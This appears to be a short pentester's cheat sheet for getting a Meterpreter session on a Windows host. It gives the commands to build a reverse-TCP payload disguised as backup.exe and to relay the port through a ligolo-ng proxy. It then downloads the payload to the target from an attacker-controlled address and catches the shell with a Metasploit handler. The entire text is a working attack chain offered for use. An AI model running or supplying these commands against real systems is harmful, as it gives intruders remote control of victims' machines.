```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.219.254 LPORT=3324 -f exe -o backup.exe
```

ligolo proxy add
```
listener_add --addr 0.0.0.0:3324 --to 0.0.0.0:3324
```

download payload
```
cd C:\TEMP
rm backup.exe
iwr http://172.16.219.254:1235/backup.exe -outfile backup.exe
```

start multi/handler
```
msfconsole -q -x 'use exploit/multi/handler;set LHOST 0.0.0.0;set LPORT 3324;set payload windows/x64/meterpreter/reverse_tcp;run'
```

wait a seconds